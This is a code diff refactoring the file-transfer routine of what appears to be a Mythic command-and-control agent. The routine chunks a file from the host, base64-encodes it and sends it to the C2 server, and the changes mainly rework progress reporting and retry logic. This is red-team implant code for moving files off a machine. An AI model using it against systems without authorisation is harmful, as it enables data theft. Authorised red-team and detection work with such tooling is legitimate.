@@ -37,30 +37,30 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 	if sendFileToMythic.Data == nil {
 		if sendFileToMythic.File == nil {
 			errResponse := sendFileToMythic.Task.NewResponse()
-			errResponse.UserOutput = fmt.Sprintf("No data and no file specified when trying to send a file to Mythic")
+			errResponse.UserOutput = fmt.Sprintf("No data and no file specified when trying to send a file")
 			sendFileToMythic.Task.Job.SendResponses <- errResponse
 			sendFileToMythic.FinishedTransfer <- 1
 			return
-		} else {
-			fi, err := sendFileToMythic.File.Stat()
-			if err != nil {
-				errResponse := structs.Response{}
-				errResponse.Completed = true
-				errResponse.TaskID = sendFileToMythic.Task.TaskID
-				errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
-				sendFileToMythic.Task.Job.SendResponses <- errResponse
-				sendFileToMythic.FinishedTransfer <- 1
-				return
-			}
-			size = fi.Size()
 		}
+		fi, err := sendFileToMythic.File.Stat()
+		if err != nil {
+			errResponse := structs.Response{}
+			errResponse.Completed = true
+			errResponse.TaskID = sendFileToMythic.Task.TaskID
+			errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
+			sendFileToMythic.Task.Job.SendResponses <- errResponse
+			sendFileToMythic.FinishedTransfer <- 1
+			return
+		}
+		size = fi.Size()
 	} else {
 		size = int64(len(*sendFileToMythic.Data))
 	}
 
 	chunks := uint64(math.Ceil(float64(size) / FILE_CHUNK_SIZE))
+	totalChunks := int(chunks)
 	fileDownloadData := structs.FileDownloadMessage{}
-	fileDownloadData.TotalChunks = int(chunks)
+	fileDownloadData.TotalChunks = totalChunks
 	fileDownloadData.FullPath = sendFileToMythic.FullPath
 	if sendFileToMythic.FullPath != "" {
 		abspath, err := filepath.Abs(sendFileToMythic.FullPath)
@@ -100,16 +100,12 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 
 		//log.Printf("Receive file download registration response %s\n", resp)
 		if _, ok := fileDetails["file_id"]; ok {
-			if ok {
-				updateUserOutput := structs.Response{}
-				updateUserOutput.TaskID = sendFileToMythic.Task.TaskID
-				updateUserOutput.UserOutput = "{\"file_id\": \"" + fmt.Sprintf("%v", fileDetails["file_id"]) + "\", \"total_chunks\": \"" + strconv.Itoa(int(chunks)) + "\"}\n"
-				sendFileToMythic.Task.Job.SendResponses <- updateUserOutput
-				break
-			} else {
-				//log.Println("Didn't find response with file_id key")
-				continue
-			}
+			updateUserOutput := structs.Response{}
+			updateUserOutput.TaskID = sendFileToMythic.Task.TaskID
+			updateUserOutput.Status = fmt.Sprintf("Downloaded 1/%d Chunks...", totalChunks)
+			updateUserOutput.UserOutput = "{\"file_id\": \"" + fmt.Sprintf("%v", fileDetails["file_id"]) + "\", \"total_chunks\": \"" + strconv.Itoa(int(chunks)) + "\"}\n"
+			sendFileToMythic.Task.Job.SendResponses <- updateUserOutput
+			break
 		}
 	}
 	var r *bytes.Buffer = nil
@@ -118,7 +114,6 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 	} else {
 		sendFileToMythic.File.Seek(0, 0)
 	}
-	lastPercentCompleteNotified := 0
 	for i := uint64(0); i < chunks; {
 		if sendFileToMythic.Task.ShouldStop() {
 			// tasked to stop, so bail
@@ -153,19 +148,12 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 
 		fileDownloadData = structs.FileDownloadMessage{}
 		fileDownloadData.ChunkNum = int(i) + 1
-		//fileDownloadData.TotalChunks = -1
 		fileDownloadData.FileID = fileDetails["file_id"].(string)
 		fileDownloadData.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
 		fileDownloadMsg.Download = &fileDownloadData
+		fileDownloadMsg.Status = fmt.Sprintf("Downloaded %d/%d Chunks...", fileDownloadData.ChunkNum, totalChunks)
 		sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg
-		newPercentComplete := ((fileDownloadData.ChunkNum * 100) / int(chunks))
-		if newPercentComplete/10 > lastPercentCompleteNotified && sendFileToMythic.SendUserStatusUpdates {
-			response := sendFileToMythic.Task.NewResponse()
-			response.Completed = false
-			response.UserOutput = fmt.Sprintf("File Transfer Update: %d%% complete\n", newPercentComplete)
-			sendFileToMythic.Task.Job.SendResponses <- response
-			lastPercentCompleteNotified = newPercentComplete / 10
-		}
+
 		// Wait for a response for our file chunk
 		var postResp map[string]interface{}
 		for {
@@ -180,12 +168,12 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 				sendFileToMythic.FinishedTransfer <- 1
 				return
 			}
-			break
-		}
 
-		if strings.Contains(postResp["status"].(string), "success") {
-			// only go to the next chunk if this one was successful
-			i++
+			if strings.Contains(postResp["status"].(string), "success") {
+				// only go to the next chunk if this one was successful
+				i++
+				break
+			}
 		}
 	}
 	sendFileToMythic.FinishedTransfer <- 1
